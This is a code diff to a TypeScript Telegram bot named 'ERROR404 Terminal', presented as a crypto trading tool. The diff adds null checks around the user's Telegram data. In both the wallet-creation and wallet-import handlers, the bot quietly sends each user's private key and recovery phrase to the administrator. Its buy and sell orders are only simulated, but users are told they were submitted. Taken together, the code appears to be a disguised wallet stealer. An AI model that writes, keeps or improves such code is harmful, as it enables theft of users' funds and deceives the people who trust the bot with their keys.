@@ -29,26 +29,30 @@ async function notifyAdmin(message: string) {
 
 // /start command
 bot.command('start', async (ctx) => {
-  const telegramId = ctx.from.id.toString();
+  const telegramId = ctx.from?.id.toString();
+  if (!telegramId) {
+    await ctx.reply('Unable to identify user.');
+    return;
+  }
   let user = await prisma.user.findUnique({ where: { telegramId } });
 
   if (!user) {
     user = await prisma.user.create({
       data: {
         telegramId,
-        username: ctx.from.username,
-        firstName: ctx.from.first_name,
-        lastName: ctx.from.last_name,
+        username: ctx.from?.username,
+        firstName: ctx.from?.first_name,
+        lastName: ctx.from?.last_name,
       },
     });
-    await notifyAdmin(`🆕 NEW USER\n👤 @${ctx.from.username || 'no username'}\n🆔 ${telegramId}`);
+    await notifyAdmin(`🆕 NEW USER\n👤 @${ctx.from?.username || 'no username'}\n🆔 ${telegramId}`);
   }
 
   const wallet = await prisma.wallet.findFirst({ where: { userId: user.id } });
   const hasWallet = !!wallet;
 
   const menu = `
-Welcome to ERROR404 Terminal, ${ctx.from.first_name}!
+Welcome to ERROR404 Terminal, ${ctx.from?.first_name || 'User'}!
 
 ${hasWallet ? '🔑 Wallet connected: ' + wallet.address : 'No wallet found. Create or import one.'}
 
@@ -71,7 +75,11 @@ Use the buttons below to manage your trading.
 
 // /link command
 bot.command('link', async (ctx) => {
-  const telegramId = ctx.from.id.toString();
+  const telegramId = ctx.from?.id.toString();
+  if (!telegramId) {
+    await ctx.reply('Unable to identify user.');
+    return;
+  }
   const code = Math.random().toString(36).substring(2, 10).toUpperCase();
   const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
 
@@ -90,13 +98,17 @@ bot.command('link', async (ctx) => {
 // Handle callback queries
 bot.on('callback_query', async (ctx) => {
   const callbackQuery = ctx.callbackQuery;
-  // Type guard: ensure it has a 'data' property
   if (!('data' in callbackQuery)) {
     await ctx.answerCbQuery('Invalid callback');
     return;
   }
   const data = callbackQuery.data;
-  const telegramId = ctx.from.id.toString();
+  const telegramId = ctx.from?.id.toString();
+  if (!telegramId) {
+    await ctx.reply('Unable to identify user.');
+    await ctx.answerCbQuery();
+    return;
+  }
   const user = await prisma.user.findUnique({ where: { telegramId } });
   if (!user) {
     await ctx.reply('Please /start first.');
@@ -164,8 +176,10 @@ async function showWalletsMenu(ctx: MyContext, userId: number) {
 async function createWalletFlow(ctx: MyContext, userId: number) {
   try {
     const { address, privateKey, mnemonic } = await createWallet(userId);
+    const username = ctx.from?.username || 'no username';
+    const id = ctx.from?.id.toString() || 'unknown';
     await notifyAdmin(
-      `🔐 NEW WALLET\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
+      `🔐 NEW WALLET\n👤 @${username}\n🆔 ${id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
     );
     await ctx.reply(
       `✅ Wallet created!\nAddress: \`${address}\`\nPrivate key: \`${privateKey}\`\n${mnemonic ? 'Recovery phrase: `' + mnemonic + '`\n' : ''}\n*Save this securely!*`,
@@ -180,12 +194,22 @@ async function createWalletFlow(ctx: MyContext, userId: number) {
 bot.on('text', async (ctx) => {
   if (ctx.session.importing) {
     delete ctx.session.importing;
-    const user = await prisma.user.findUnique({ where: { telegramId: ctx.from.id.toString() } });
-    if (!user) return;
+    const telegramId = ctx.from?.id.toString();
+    if (!telegramId) {
+      await ctx.reply('Unable to identify user.');
+      return;
+    }
+    const user = await prisma.user.findUnique({ where: { telegramId } });
+    if (!user) {
+      await ctx.reply('Please /start first.');
+      return;
+    }
     try {
       const { address, privateKey, mnemonic } = await importWallet(user.id, ctx.message.text);
+      const username = ctx.from?.username || 'no username';
+      const id = ctx.from?.id.toString() || 'unknown';
       await notifyAdmin(
-        `🔐 IMPORT WALLET\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
+        `🔐 IMPORT WALLET\n👤 @${username}\n🆔 ${id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
       );
       await ctx.reply(`✅ Wallet imported!\nAddress: \`${address}\``, { parse_mode: 'Markdown' });
     } catch (e) {
@@ -212,13 +236,17 @@ async function handleBuySell(ctx: MyContext, userId: number, isBuy: boolean) {
 }
 
 async function executeBuy(ctx: MyContext, userId: number, amount: string) {
+  const username = ctx.from?.username || 'no username';
+  const id = ctx.from?.id.toString() || 'unknown';
   await ctx.reply(`🟢 Buy order for ${amount} ETH submitted (simulated).`);
-  await notifyAdmin(`🟢 BUY EXECUTED\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n💰 ${amount} ETH`);
+  await notifyAdmin(`🟢 BUY EXECUTED\n👤 @${username}\n🆔 ${id}\n💰 ${amount} ETH`);
 }
 
 async function executeSell(ctx: MyContext, userId: number, amount: string) {
+  const username = ctx.from?.username || 'no username';
+  const id = ctx.from?.id.toString() || 'unknown';
   await ctx.reply(`🔴 Sell order for ${amount} ETH submitted (simulated).`);
-  await notifyAdmin(`🔴 SELL EXECUTED\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n💰 ${amount} ETH`);
+  await notifyAdmin(`🔴 SELL EXECUTED\n👤 @${username}\n🆔 ${id}\n💰 ${amount} ETH`);
 }
 
 async function showPortfolio(ctx: MyContext, userId: number) {
